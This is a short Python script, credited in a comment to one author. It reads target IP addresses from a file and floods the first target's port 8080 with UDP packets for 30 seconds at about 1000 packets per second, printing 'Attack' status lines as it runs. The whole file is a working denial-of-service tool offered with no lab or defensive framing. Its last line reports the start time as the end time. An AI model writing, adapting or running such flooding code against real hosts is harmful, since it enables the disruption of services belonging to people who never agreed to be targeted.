import socket
import sys
import time

# Liam Calder

# Read target IPs from a file (one per line)
with open('targets.txt', 'r') as f:
    target_ips = [line.strip() for line in f if line.strip()]

# Use the first target IP from the file (you can modify this to select a different one)
if not target_ips:
    print("No target IP found in targets.txt")
    sys.exit(1)

TARGET_IP = target_ips[0]
TARGET_PORT = 8080
DURATION = 30  # Duration in seconds
PACKET_RATE = 1000  # Packets per second

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
message = b'Attack'
current_time = time.time()

print(f"Starting UDP flood on {TARGET_IP}:{TARGET_PORT}")
print(f"Attack started at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
print(f"Duration: {DURATION} seconds")
print(f"Packet rate: {PACKET_RATE} packets/second")

end_time = time.time() + DURATION

try:
    while time.time() < end_time:
        sock.sendto(message, (TARGET_IP, TARGET_PORT))
        time.sleep(1 / PACKET_RATE)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
    sys.exit(0)

print("UDP flood completed.")
print(f"Attack ended at {time.strftime('%H:%M:%S', time.localtime(current_time))}.")
